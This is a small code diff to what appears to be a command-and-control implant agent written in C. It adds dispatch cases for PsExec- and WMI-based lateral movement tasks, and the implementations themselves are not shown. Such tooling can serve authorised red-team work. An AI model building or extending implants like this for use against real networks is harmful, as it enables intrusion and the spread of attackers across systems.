@@ -16,6 +16,7 @@
 #include "Tasks/Token.h"
 #include "Tasks/Link.h"
 #include "Tasks/Exit.h"
+#include "Tasks/LateralMovement.h"
 
 /**
  * @brief Process commands from GET_TASKING
@@ -278,6 +279,22 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("UNLINK_CMD was called");
             UnLink(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JUMP_PSEXEC
+        case JUMP_PSEXEC_CMD:
+        {
+            _dbg("JUMP_PSEXEC_CMD was called");
+            LateralMovementPsexec(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JUMP_WMI
+        case JUMP_WMI_CMD:
+        {
+            _dbg("JUMP_WMI_CMD was called");
+            LateralMovementWmi(taskUuid, taskParser);
             return;
         }
 #endif
